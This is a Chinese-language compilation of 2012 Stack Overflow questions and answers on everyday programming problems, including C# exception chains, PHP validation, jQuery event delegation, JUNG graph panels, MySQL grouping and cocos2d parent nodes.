> 赞同：2
> 
> 时间：2012-09-17T17:27:20.917

如果加载模块，

```
Module m = read(aModuleOtherThanTheCurrentlyOpenModule, false) 
```

然后它应该将整个模块加载到本地客户端。这意味着此时访问模块中的任何信息都将是客户端。直到你通过关闭它，

```
close m 
```

但是，DOORS 的未来版本（即尚未发布的 DOORS Next Generation）不太可能以这种方式运行。

# c# - 如何将我的异常信息放入 IEnumerable

> ID：12461144
> 
> 赞同：3
> 
> 时间：2012-09-17T14:12:56.607
> 
> 标签：c#

我正在使用以下代码从我的 MVC 模型状态中获取异常：

```
 IEnumerable<string> exceptions = ModelState (x => x.Value.Errors
                .Where(error => (error != null) &&
                                (error.Exception != null) &&
                                (error.Exception.Message != null))
                .Select(error => error.Exception.Message)); 
```

对于 try-catch 块异常**，我如何编写一种方法来获取异常 e 并使其如此我的异常和内部异常消息也**像我上面所做的那样放入 IEnumerable 中？

我的问题是我不确定如何处理可能存在多级异常的事实。

不确定这是否有帮助，但这是我之前用来将异常放入字符串的代码：

```
 public static string GetFormattedErrorMessage(this Exception e)
    {
        var exError = "";
        if ( 1 == 1) {
            if (e == null)
            {
                throw new ArgumentNullException("e");
            }

            exError = e.Message;
            if (e.InnerException != null)
            {
                exError += "<br>" + e.InnerException.Message;
                exError += "<br>" + e.StackTrace;
                if (e.InnerException.InnerException != null)
                {
                    exError += "<br>" + e.InnerException.InnerException.Message;
                }
            }
        } else {
            exError = "System error";
        }
        return exError;
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:18:53.583

您可以遍历内部异常，例如

```
public IEnumerable<string> GetErrors(Exception ex)
{
    ...

    var results = new List<string>() { ex.Message };
    var innerEx = ex.InnerException;
    while (innerEx != null) 
    {
        results.Add(innerEx.Message);
        innerEx = innerEx.InnerException;
    }
    return results;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:31:58.643

这听起来像是递归方法的问题。看看以下是否可以帮助您入门。我将由您决定包含 StackTrace 并处理 AggregateExceptions：

```
public static IEnumerable<string> FormatExceptionHtml(Exception instance)
{
    if (instance != null)
        yield return instance.Message + "<br />";
    if (instance.InnerException != null)
        foreach (var inner in FormatExceptionHtml(instance.InnerException))
        {
            yield return inner;
        }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:31:20.090

看起来唯一“有趣”的部分是枚举内部异常。无需手动构建数据结构；一个简单的枚举器应该大大简化问题：

```
public static IEnumerable<Exception> AsEnumerable(this Exception self)
{
    for (var e = self; e != null; e = e.InnerException) yield return e;
}

foreach (var e in myException.AsEnumerable()) { /* print debug info */ }

// or
var exceptionString = string.Join("<br>", myException.AsEnumerable().Select(e =>
    /* debug info */
)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:26:49.707

要么使用递归来获取每个级别的异常：

```
private static string GetFormattedErrorMessage(this Exception ex)
{
    StringBuilder sb = new StringBuilder();
    if (ex != null)
    {
        sb.AppendLine(ex.Message);
        sb.AppendLine(ex.StackTrace);
        sb.AppendLine(ex.InnerException.GetFormattedErrorMessage());
    }
    return sb.ToString();
} 
```

或者使用普通的

```
ex.ToString(); 
```

这会很好地打印出来。

# php - PHP filter_var：如何确保用户提供正确的数据类型 - 仅限真或假

> ID：12461146
> 
> 赞同：0
> 
> 时间：2012-09-17T14:13:00.840
> 
> 标签：php, boolean, php-5.3, filter-var

我想比较两个数组，一个是默认设置的，另一个是用户输入的。

当我仅在默认值中设置布尔值时，我想确保用户不会使用字符串或数字。例如，'truex' 或 '1' 是不可接受的。

下面是我的代码示例，

```
$default = array(
    "randomise"     =>  false,
    "id"            =>  null
);

$config = array(
    "randomise"     =>  truex
);

function process_array($default,$config)
{
    # Loop the array.
    foreach($default as $key => $value)
    {

        if ((filter_var($default[$key], FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) === NULL) && (filter_var($config[$key], FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) === NULL)) 
        {
            return 'true or false only';
        }

    }

    # Return the result.
    return $array;
}

print_r(process_array($default,$config)); 
```

但是即使用户提供了正确的数据类型，此代码也会返回“仅真或假”。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:28:09.987

好的，首先您需要检查`$config`包含`$default`. [旁白：如果`$config`是用户提供的......他们永远不会用户提供这样的对象，也许你的意思是`$config=array("randomize"=>"truex");`......除非用户提供你的意思是其他开发人员作为用户（不是网络用户））。

其次，`$config['id']`您编写的测试总是会失败（因为它不是布尔值）。

所以，我试图猜测你在这里做什么，但我认为这就是你想要的......

```
$default = array("randomise"=>false,"id"=>null);
//Example input
$config = array("randomise"=>"truex");

function process_array($default,$config) {
   foreach($default as $key => $value) {
      if (is_bool($default[$key])
          && isset($config[$key])) {
         //Update the array with the filtered value
         $config[$key]=filter_var($config[$key],FILTER_VALIDATE_BOOLEAN, 
                                  FILTER_NULL_ON_FAILURE);
         if ($config[$key]===null)
            return '$key can be true or false only';
         }
      }
   }
    return $array;
}
print_r(process_array($default,$config)); 
```

# android - 如何从 Android 的联系人列表中获取“我”联系人

> ID：12461147
> 
> 赞同：2
> 
> 时间：2012-09-17T14:13:03.550
> 
> 标签：android, android-contacts, phone-number

在我的 Android 手机上，我的联系人列表中有一个名为“个人资料”的特殊联系人，它显然没有出现在联系人列表中，因为其中包含我的个人信息。我知道在其他手机中，这个联系人的呼叫方式不同……但是有没有……

我想从我的应用程序中访问此联系人，以便我有更多机会获取用户电话号码。（我知道，有一种查询 SIM 卡的标准方法，但在意大利 80% 的模拟卡的该字段为空）

你知道我怎么能得到那个联系信息吗？

# crystal-reports - 打开带有参数的 Crystal Report

> ID：12461148
> 
> 赞同：0
> 
> 时间：2012-09-17T14:13:18.490
> 
> 标签：crystal-reports, crystal-reports-2008

通常，我使用微软报告，我可以调用参数。

但对于 Crystal Report 2008，我想用参数调用报表，以查看报表上我的 bd 中的数据。

我的报告绑定到一个数据集。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T17:27:06.427

希望以下链接对您有所帮助

[如何使用 vb.net 中的数据集在水晶报表中传递参数](http://forums.asp.net/t/1384708.aspx/1)

[Crystal Report 基础知识和与 DataSet 的集成](http://www.codeproject.com/Articles/18332/Crystal-Report-Basics-and-Integration-with-DataSet)

[在水晶报表中显示 GridView](http://forums.asp.net/p/1359067/2825312.aspx#2825312)

# android - 公共 onCreate() 还是受保护的 onCreate()？

> ID：12461150
> 
> 赞同：6
> 
> 时间：2012-09-17T14:13:23.917
> 
> 标签：android, public, protected, oncreate

在阅读“Hello, Android”一书时，我注意到：

> `onCreate(Bundle savedInstanceState)`每个带有方法的 java 文件，在程序的主 Activity 中都具有**受保护**的访问修饰符 EXCEPT [具有：`public void onCreate(Bundle savedInstanceState)`]。

为什么`onCreate`方法`public`在程序的主Activity上，却`protected`在其他地方？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-05-01T13:49:04.733

onCeate **()**受到保护，以避免从活动对象调用它。

```
MyActivity activity = new MyActivity();
activity.onCreate(args);  // which doesn't make sense because activity is not yet created 
```

由于仅在创建活动时调用此方法，因此您自己调用它很可能会给您一个**nullpointerException**，因为活动尚未创建。[S/O 邮政](https://stackoverflow.com/questions/5652661/why-is-oncreate-in-activity-protected)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:49:57.787

您可以更改方法的可见性。你不能做的是：降低可见性（将公共方法设为私有），访问私有方法（将其设为公开）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:16:42.453

它也可以`protected`。没有什么重要或明智的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-05-01T14:06:44.400

没有理由公开该方法（但这样做不会影响任何事情）。无论如何，您不应该手动调用它。

顺便说一句，Intellij IDEA 有带有 public 的 Activity 模板`onCreate`。这可能是该方法在书中公开的原因。

# jquery - 使用 jquery .on() 与 .click()

> ID：12461152
> 
> 赞同：1
> 
> 时间：2012-09-17T14:13:30.037
> 
> 标签：jquery

我有一个播放流的网站。一旦有人按下按钮，我就会对服务器执行 AJAX 调用。

```
<input type="submit" class="play" data-type="<?php echo $result_cameras[$i]["camera_type"]; ?>" data-hash="<?php echo $result_cameras[$i]["camera_hash"]; ?>" value="<?php echo $result_cameras[$i]["camera_name"]; ?>"> 
```

这会打印出一组用户可以选择的按钮。这由以下代码处理：

```
<script>
$(document).ready(function(){

$(".play").on('click', function(){
    var camerahash = $(this).data('hash');
    var cameratype = $(this).data('type');
    function doAjax(){
        $.ajax({
            url: 'index.php?option=streaming&task=playstream&id_hash=<?php echo $id_hash; ?>&camera_hash='+camerahash+'&format=raw',
            success: function(data) {
                if (data == 'Initializing...please wait')
                {
                    $('#quote p').html(data); //shows a message here
                    setTimeout(doAjax, 2000);
                }
                else
                {
                    if (cameratype == "WEBCAM" && data == 'Stream is ready...')
                    {
                        $('#quote p').html(data); //another message here
                        window.location = 'rtsp://<?php echo DEVSTREAMWEB; ?>/<?php echo $session_id;?>/'+camerahash;
                    }
                    else if (cameratype == "AXIS" && data == 'Stream is ready...')
                    {
                        $('#quote p').html(data); //another message here
                        window.location = 'rtsp://<?php echo DEVSTREAMIP; ?>/<?php echo $session_id;?>/'+camerahash;
                    }
                    else
                    {
                        $('#quote p').html(data); //another message here
                    }

                }

            }
        });

    }
    doAjax();
});
});
</script> 
```

当用户单击按钮时，一切都会正常工作。但是单击另一个按钮不再显示消息。我已经将委托事件 ( `.on`) 用于动态加载的按钮 (而不是`.click()`)，我认为这可以解决这个问题，但看起来我只是没有得到我需要做的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:16:14.473

尝试使用以下内容：

```
$(document).on("click", ".play", function() {
    // Data
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:16:19.177

首先，您需要在[`.on`](http://api.jquery.com/on/). 在您的情况下，如果您没有父母/祖先，您可以指定`document`.

```
 $(document).on('click', '.play', function(){.... 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T14:17:28.047

绑定父元素并委托按钮。

例如，绑定在表上并绑定到“tr”，因为当您绑定 this 时 TR 可能不存在。

`$("#dataTable").on("click", "tr", function(event){ alert($(this).text()); });`

你应该检查 CanJS (canjs.us)，他们有这种类型的自动活页夹。

# java - 在现有框架中可视化 JUNG 示例

> ID：12461153
> 
> 赞同：0
> 
> 时间：2012-09-17T14:13:38.543
> 
> 标签：java, user-interface, jung

我正在尝试在我正在处理的项目中使用其中一个[JUNG 可视化](http://jung.sourceforge.net/index.html)示例。

我要使用的示例代码（由 JUNG 提供）如下所示：

```
package TreeVisualiser;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GridLayout;
import java.awt.Shape;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.geom.Ellipse2D;
import java.awt.geom.Point2D;
import java.util.Collection;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import javax.swing.BorderFactory;
import javax.swing.JApplet;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JToggleButton;

import org.apache.commons.collections15.Factory;
import org.apache.commons.collections15.functors.ConstantTransformer;

import edu.uci.ics.jung.algorithms.layout.PolarPoint;
import edu.uci.ics.jung.algorithms.layout.RadialTreeLayout;
import edu.uci.ics.jung.algorithms.layout.TreeLayout;
import edu.uci.ics.jung.graph.DirectedGraph;
import edu.uci.ics.jung.graph.DirectedSparseMultigraph;
import edu.uci.ics.jung.graph.Forest;
import edu.uci.ics.jung.graph.DelegateForest;
import edu.uci.ics.jung.graph.DelegateTree;
import edu.uci.ics.jung.graph.Tree;
import edu.uci.ics.jung.visualization.GraphZoomScrollPane;
import edu.uci.ics.jung.visualization.Layer;
import edu.uci.ics.jung.visualization.VisualizationServer;
import edu.uci.ics.jung.visualization.VisualizationViewer;
import edu.uci.ics.jung.visualization.control.CrossoverScalingControl;
import edu.uci.ics.jung.visualization.control.DefaultModalGraphMouse;
import edu.uci.ics.jung.visualization.control.ModalGraphMouse;
import edu.uci.ics.jung.visualization.control.ScalingControl;
import edu.uci.ics.jung.visualization.decorators.EdgeShape;
import edu.uci.ics.jung.visualization.decorators.ToStringLabeller;
import edu.uci.ics.jung.visualization.layout.LayoutTransition;
import edu.uci.ics.jung.visualization.util.Animator;

/**
 * Demonsrates TreeLayout and RadialTreeLayout.
 * @author Tom Nelson
 * 
 */
@SuppressWarnings("serial")
public class TreeVisualiser extends JApplet {

    Forest<String,Integer>                 graph;

    Factory<DirectedGraph<String,Integer>> graphFactory =  new Factory<DirectedGraph<String,Integer>>() { 
                                                                public DirectedGraph<String, Integer> create() {
                                                                    return new DirectedSparseMultigraph<String,Integer>();
                                                                }
                                                            };

    Factory<Tree<String,Integer>>          treeFactory = new Factory<Tree<String,Integer>> () {
                                                                public Tree<String, Integer> create() {
                                                                    return new DelegateTree<String,Integer>(graphFactory);
                                                                }
                                                         };

    Factory<Integer>                        edgeFactory = new Factory<Integer>() {
                                                            int i=0;
                                                            public Integer create() {
                                                                    return i++;
                                                            }
                                                           };

    Factory<String>                         vertexFactory = new Factory<String>() {
                                                                int i=0;
                                                                public String create() {
                                                                    return "V"+i++;
                                                                }
                                                            };
/**
 * the visual component and renderer for the graph
 */
VisualizationViewer<String,Integer>     vv;

VisualizationServer.Paintable           rings;

String                                  root;

TreeLayout<String,Integer>              treeLayout;

RadialTreeLayout<String,Integer>        radialLayout;

@SuppressWarnings({ "rawtypes", "unchecked" })
public TreeVisualiser() {

    // create a simple graph for the demo
    graph = new DelegateForest<String,Integer>();

    createTree();

    treeLayout = new TreeLayout<String,Integer>(graph);
    radialLayout = new RadialTreeLayout<String,Integer>(graph);
    radialLayout.setSize(new Dimension(600,600));
    vv =  new VisualizationViewer<String,Integer>(treeLayout, new Dimension(600,600));
    vv.setBackground(Color.white);
    vv.getRenderContext().setEdgeShapeTransformer(new EdgeShape.Line());
    vv.getRenderContext().setVertexLabelTransformer(new ToStringLabeller());
    // add a listener for ToolTips
    vv.setVertexToolTipTransformer(new ToStringLabeller());
    vv.getRenderContext().setArrowFillPaintTransformer(new ConstantTransformer(Color.lightGray));
    rings = new Rings();

    Container content = getContentPane();
    final GraphZoomScrollPane panel = new GraphZoomScrollPane(vv);
    content.add(panel);

    final DefaultModalGraphMouse graphMouse = new DefaultModalGraphMouse();

    vv.setGraphMouse(graphMouse);

    JComboBox modeBox = graphMouse.getModeComboBox();
    modeBox.addItemListener(graphMouse.getModeListener());
    graphMouse.setMode(ModalGraphMouse.Mode.TRANSFORMING);

    final ScalingControl scaler = new CrossoverScalingControl();

    JButton plus = new JButton("+");
    plus.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            scaler.scale(vv, 1.1f, vv.getCenter());
        }
    });
    JButton minus = new JButton("-");
    minus.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            scaler.scale(vv, 1/1.1f, vv.getCenter());
        }
    });

    JToggleButton radial = new JToggleButton("Radial");
    radial.addItemListener(new ItemListener() {

        public void itemStateChanged(ItemEvent e) {
            if(e.getStateChange() == ItemEvent.SELECTED) {

                LayoutTransition<String,Integer> lt =
                    new LayoutTransition<String,Integer>(vv, treeLayout, radialLayout);
                Animator animator = new Animator(lt);
                animator.start();
                vv.getRenderContext().getMultiLayerTransformer().setToIdentity();
                vv.addPreRenderPaintable(rings);
            } else {
                LayoutTransition<String,Integer> lt =
                    new LayoutTransition<String,Integer>(vv, radialLayout, treeLayout);
                Animator animator = new Animator(lt);
                animator.start();
                vv.getRenderContext().getMultiLayerTransformer().setToIdentity();
                vv.removePreRenderPaintable(rings);
            }
            vv.repaint();
        }});

    JPanel scaleGrid = new JPanel(new GridLayout(1,0));
    scaleGrid.setBorder(BorderFactory.createTitledBorder("Zoom"));

    JPanel controls = new JPanel();
    scaleGrid.add(plus);
    scaleGrid.add(minus);
    controls.add(radial);
    controls.add(scaleGrid);
    controls.add(modeBox);

    content.add(controls, BorderLayout.SOUTH);
}

class Rings implements VisualizationServer.Paintable {

    Collection<Double> depths;

    public Rings() {
        depths = getDepths();
    }

    private Collection<Double> getDepths() {
        Set<Double> depths = new HashSet<Double>();
        Map<String,PolarPoint> polarLocations = radialLayout.getPolarLocations();
        for(String v : graph.getVertices()) {
            PolarPoint pp = polarLocations.get(v);
            depths.add(pp.getRadius());
        }
        return depths;
    }

    public void paint(Graphics g) {
        g.setColor(Color.lightGray);

        Graphics2D g2d = (Graphics2D)g;
        Point2D center = radialLayout.getCenter();

        Ellipse2D ellipse = new Ellipse2D.Double();
        for(double d : depths) {
            ellipse.setFrameFromDiagonal(center.getX()-d, center.getY()-d, 
                    center.getX()+d, center.getY()+d);
            Shape shape = vv.getRenderContext().getMultiLayerTransformer().getTransformer(Layer.LAYOUT).transform(ellipse);
            g2d.draw(shape);
        }
    }

    public boolean useTransform() {
        return true;
    }
}

/**
 * 
 */
private void createTree() {
    graph.addVertex("V0");
    graph.addEdge(edgeFactory.create(), "V0", "V1");
    graph.addEdge(edgeFactory.create(), "V0", "V2");
    graph.addEdge(edgeFactory.create(), "V1", "V4");
    graph.addEdge(edgeFactory.create(), "V2", "V3");
    graph.addEdge(edgeFactory.create(), "V2", "V5");
    graph.addEdge(edgeFactory.create(), "V4", "V6");
    graph.addEdge(edgeFactory.create(), "V4", "V7");
    graph.addEdge(edgeFactory.create(), "V3", "V8");
    graph.addEdge(edgeFactory.create(), "V6", "V9");
    graph.addEdge(edgeFactory.create(), "V4", "V10");

    graph.addVertex("A0");
    graph.addEdge(edgeFactory.create(), "A0", "A1");
    graph.addEdge(edgeFactory.create(), "A0", "A2");
    graph.addEdge(edgeFactory.create(), "A0", "A3");

    graph.addVertex("B0");
    graph.addEdge(edgeFactory.create(), "B0", "B1");
    graph.addEdge(edgeFactory.create(), "B0", "B2");
    graph.addEdge(edgeFactory.create(), "B1", "B4");
    graph.addEdge(edgeFactory.create(), "B2", "B3");
    graph.addEdge(edgeFactory.create(), "B2", "B5");
    graph.addEdge(edgeFactory.create(), "B4", "B6");
    graph.addEdge(edgeFactory.create(), "B4", "B7");
    graph.addEdge(edgeFactory.create(), "B3", "B8");
    graph.addEdge(edgeFactory.create(), "B6", "B9");

}

/**
 * a driver for this demo
 */
public static void main(String[] args) {
    JFrame frame = new JFrame();
    Container content = frame.getContentPane();
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    content.add(new TreeVisualiser());
    frame.pack();
    frame.setVisible(true);
} 
```

}

在示例中，图形直接在框架中构建，但我想在我已经构建的 GUI 中使用该图形。为此，必须将相同的图表放在面板中：

```
public MainGUI(String s) {
     super(s);

     // Content pane
     Container content = this.getContentPane();
     content.setBackground(Color.lightGray);
     content.setLayout(new GridBagLayout());
     GridBagConstraints c = new GridBagConstraints();

 treePanel = new JPanel();
     c.fill = GridBagConstraints.HORIZONTAL;
     c.ipadx = FRAMEX - 25;
     c.ipady = FRAMEY - 300;      //make this component tall
     c.gridwidth = 3;
     c.gridx = 0;
     c.gridy = 1;
     content.add(treePanel, c);
     }

private void displayTree() {
     treePanel.add(new TreeVisualiser());
 } 
```

这根本不显示图表。有没有人使用 JUNG 库的经验并且知道这里可能存在什么问题？

# php - Mysql查询选择具有不同列值的结果

> ID：12461155
> 
> 赞同：0
> 
> 时间：2012-09-17T14:13:39.573
> 
> 标签：php, mysql, sql

我有一张展示书籍的桌子。但是，我希望每个唯一的电子邮件地址 ( `strContactEmail`) 只显示一本书。我尝试了下面的查询，它没有用。非常感谢任何帮助。`

```
$sql =  "SELECT lngbookid, strTitle, strAuthor, strcoursecode, strISBN, ".
        " strcontactname, DISTINCT(strContactEmail) AS strContactEmail, ".
        " curPrice, ysnsalerent, dtmpostdate, memcomments, school, ".
        " ASIN, BookIMG, ISBN10, ISBN13, Updated, ".
        " datetime, user_ip, NoOtherBooks ".
        " FROM tblbooks ".
        " WHERE strcoursecode LIKE '%$search%'  ".
        " ORDER BY datetime DESC LIMIT 50"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:29:21.903

~~最简单的方法：~~

 ~~```
SELECT max(lngbookid) as lngbookid,
       max(strtitle) as strtitle,
       max(strauthor) as strauthor,
       max(strcoursecode) as strcoursecode,
       max(strisbn) as strisbn,
       max(strcontactname) as strcontactname,
       strcontactemail,
       max(curprice) as curprice,
       max(ysnsalerent) as ysnsalerent,
       max(dtmpostdate) as dtmpostdate,
       max(memcomments) as memcomments,
       max(school) as school,
       max(asin) as asin,
       max(bookimg) as bookimg,
       max(isbn10) as isbn10,
       max(isbn13) as isbn13,
       max(updated) as updated,
       max(datetime) as datetime,
       max(user_ip) as user_ip,
       max(nootherbooks) as nootherbooks
FROM   tblbooks
WHERE  strcoursecode LIKE '%$search%'
GROUP BY strcontactemail
ORDER  BY datetime DESC
LIMIT  50 
```~~  ~~**编辑** 好吧，上面的内容实际上太“假”了。更好的方法是（假设“lngbookid”列是主键）：

```
SELECT a.lngbookid,
       a.strtitle,
       a.strauthor,
       a.strcoursecode,
       a.strisbn,
       a.strcontactname,
       a.strcontactemail,
       a.ontactemail,
       a.curprice,
       a.ysnsalerent,
       a.dtmpostdate,
       a.memcomments,
       a.school,
       a.asin,
       a.bookimg,
       a.isbn10,
       a.isbn13,
       a.updated,
       a.datetime,
       a.user_ip,
       a.nootherbooks
FROM   tblbooks AS a
       JOIN (SELECT strcontactemail,
                    Max(lngbookid) AS lngbookid
             FROM   tblbooks
             GROUP  BY strcontactemail) AS b
         ON ( a.strcontactemail = b.strcontactemail
              AND a.lngbookid = b.lngbookid ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:17:09.003

尝试使用 GROUP BY 语句：

[http://www.w3schools.com/sql/sql_groupby.asp](http://www.w3schools.com/sql/sql_groupby.asp)~~

# iphone - 使用 self.parent 在父类中调用另一个方法有时会失败

> ID：12461156
> 
> 赞同：0
> 
> 时间：2012-09-17T14:13:53.073
> 
> 标签：iphone, objective-c, cocos2d-iphone

我有 1 `CCScene`( `PlayScene`) 和 2 `CCLayer`( `PlayLayer`and `HUDLayer`) 作为它的孩子。在我的`PlayLayer.m`情况下，我正在调用我在`PlayScene`课堂上声明的另一种方法。我调用该方法的方式是通过以下代码（in `PlayLayer.m`）：

```
[(PlayScene *) self.parent gameStory:@"story2.png"]; 
```

该方法声明如下（in `PlayScene.h`）：

```
-(void)gameStory:(NSString *)imgName; 
```

让我感到困惑的是，我在代码的底部做了同样的事情，而且它有效，方法被调用了。但是当我尝试在 PlayLayer.m 的开头更早地再次调用此方法时，由于`self.parent = (null)`.

任何人都可以帮我点亮一些灯吗？

PS该方法最终会调用另一个方法`HUDLayer.m`，以防万一这件事让你更清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T08:40:01.020

如果你初始化一个子节点，它的 parent 属性在初始化期间将是 nil。

解决方案：将需要访问父级的代码推迟到onEnter，在addChild运行时调用：

```
-(id) init
{
    self = [super init];
    if (self)
    {
        // does not work, parent is nil:
        [(PlayScene *) self.parent gameStory:@"story2.png"];
    }
    return self;
}

-(void) onEnter
{
    [super onEnter];

    // works, parent is set:
    [(PlayScene *) self.parent gameStory:@"story2.png"];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:33:40.213

您还可以使用委托来调用父方法：http: [//mobiledevelopertips.com/objective-c/the-basics-of-protocols-and-delegates.html](http://mobiledevelopertips.com/objective-c/the-basics-of-protocols-and-delegates.html)

[http://obj-c.pl/objective-c-podstawy-1-3-klasy-i-delegaty/](http://obj-c.pl/objective-c-podstawy-1-3-klasy-i-delegaty/)

# javascript - 每个功能的快捷键

> ID：12461158
> 
> 赞同：0
> 
> 时间：2012-09-17T14:14:00.910
> 
> 标签：javascript, each, shortcut, keyevent, onkeydown

我正在编写一个小脚本来捕获键事件并轻松地在它们上绑定函数。但我现在被困住了！

问题是，如果我初始化多个“事件处理程序”，它会覆盖第一次初始化的参数。

千言万语不比几行代码多。所以，这是我到目前为止所做的：

```
var keyCodes={a:65,b:66,c:67,d:68,e:69,f:70,g:71,h:72,i:73,j:74,k:75,l:76,m:77,n:78,o:79,p:80,q:81,r:82,s:83,t:84,u:85,v:86,w:87,x:88,y:89,z:90,"0":48,"1":49,"2":50,"3":51,"4":52,"5":53,"6":54,"7":55,"8":56,"9":57,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123,shift:16,ctrl:17,control:17,alt:18,option:18,opt:18,cmd:224,command:224,fn:255,"function":255,backspace:8,"delete":8,enter:13,"return":13,left:37,up:38,right:39,down:40};

var keyCall = function(k, fn, c, e, k2, nk) {
    this.onkeydown = function() {
        nk = k.split(" ");
        c = e ? e.which : event.keyCode;
        if (nk.length > 1) {
            if (keyCodes[nk[0]] === c) {
                k2 = true;
            }
            if (keyCodes[nk[1]] === c && k2 === true) {
                fn();
                k2 = false;
            }
        } else if (keyCodes[nk[0]] === c) {
            fn();
        }
    };
};

keyCall('ctrl a', function() { // overridden by `keyCall('shift a'`
    alert('callback1');
});

keyCall('shift a', function() {
    alert('callback2');
}); 
```

如果您认为带注释的版本很有用，我已经将其优化为极少的字节，那就直说吧！对于每个需要的人，这里有一个[小提琴](http://jsfiddle.net/ARTsinn/HLUYt/)

**更新**

pascalfree 已修复它！但是现在又出现了一个问题……

“占位符”-变量`k2`检查第一个键是否被按下。但是现在，如果您按下并释放`ctrl`并随后点击-`a`键，该功能将被触发。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:33:56.357

我假设 onKeyPress 事件绑定到一些 html 元素，如下所示：

`keyCall.apply( window.body, ['shift a', function() { alert('a') }] );`

为了附加其他事件，您可以检查是否已定义事件处理程序并在新函数中调用它：

```
var keyCall = function(k, fn, c, e, k2, nk) {
    var oldOnkeydown = this.onkeydown; //get old event handler
    this.onkeydown = function() {
        if( typeof oldOnkeydown == "function" ) { oldOnkeydown() } //call in new eventhandler.
        nk = k.split(" ");
        c = e ? e.which : event.keyCode;
        if (nk.length > 1) {
            if (keyCodes[nk[0]] === c) {
                k2 = true;
            }
            if (keyCodes[nk[1]] === c && k2 === true) {
                fn();
                k2 = false;
            }
        } else if (keyCodes[nk[0]] === c) {
            fn();
        }
    };
    //reset k2 onkeyup
    var oldOnkeyup = this.onkeyup;
    this.onkeyup = function() {
      if( typeof oldOnkeyup == "function" ) { oldOnkeyup() }
      k2 = false;
    };
}; 
```

我只添加了带有注释的 2 行。（+最后的onkeyup事件以解决评论中的问题）

来源：[http ://www.webreference.com/programming/javascript/onloads/index.html](http://www.webreference.com/programming/javascript/onloads/index.html)

# php - CSV 提要（列更改顺序）

> ID：12461159
> 
> 赞同：0
> 
> 时间：2012-09-17T14:14:01.547
> 
> 标签：php, import-from-csv

我有一个脚本来获取雅虎股票数据并且一切正常（好吧，否则我不会在这里！）

*   当我得到“goog”时，名称在“ab”行，符号在“ag”行
*   当我得到“yhoo”时，名称在“ac”行，符号在“ah”行

这导致我的数据全部混乱，任何人都可以帮忙，

我的脚本使用一个类，然后使用 foreach 循环为每个值指定一个名称，例如：

```
foreach( $objStock->getQuotes() as $code => $stock)
{
   $symbol = str_replace('"', "", $stock[32]);
   $name = str_replace('"', "", $stock[27]); 
```

获取 CSV 的示例链接（只需将“goog”更改为“yhoo”即可获取不同的表

[http://finance.yahoo.com/d/quotes.csv?s=goog&f=abc1e7jj1j5k5m5m8op2r7s7t7w1a2b6dee8gkj6lm3m6npp5rr5st1t8v7w4a5b3cc6d1e9hg5i5j4k1k4l1mm4m7p6r6vwxe1&e=.csv](http://finance.yahoo.com/d/quotes.csv?s=goog&f=abc1e7jj1j5k5m5m8op2r7s7t7w1a2b6dee8gkj6lm3m6npp5rr5st1t8v7w4a5b3cc6d1e9hg5i5j4k1k4l1mm4m7p6r6vwxe1&e=.csv)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:42:39.740

我猜你的 CSV 解析有问题。使用[str_getcsv](http://nl.php.net/manual/en/function.str-getcsv.php)怎么样？

# email - 警告：邮件（mail.log）：无法打开流：权限被拒绝

> ID：12461165
> 
> 赞同：2
> 
> 时间：2012-09-17T14:14:18.677
> 
> 标签：email, smtp, php

我正在尝试在带有 iss7 的 windows 上的服务器中使用函数 mail ，我收到了这个警告，它不允许我发送邮件：

```
Warning: mail(mail.log): failed to open stream: Permission denied in xxxx 
```

那条线是：

```
mail("mail@myserver.com", "subject", 'body',"From: mail2@myserver.com") 
```

在 php.ini 我已经配置了 SMTP 服务器、端口和 sendmail_from，如下所示：

```
; http://php.net/smtp
SMTP = 128.x.x.xxx
; http://php.net/smtp-port
smtp_port = 110

; For Win32 only.
; http://php.net/sendmail-from
sendmail_from = mymail@myserver.com

; The path to a log file that will log all mail() calls. Log entries include
; the full path of the script, line number, To address and headers.
mail.log = mail.log 
```

我还在 C:/php/ 中创建了一个名为“mail.log”的文件，并且我已经更改了所有用户的读写权限。

此外，在**phpinfo** () safe_mode 是**Off**。

我目前正在使用 PHPMailer 发送邮件，但是我想用邮件功能尝试它太慢了。

你知道我做错了什么吗？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:27:11.330

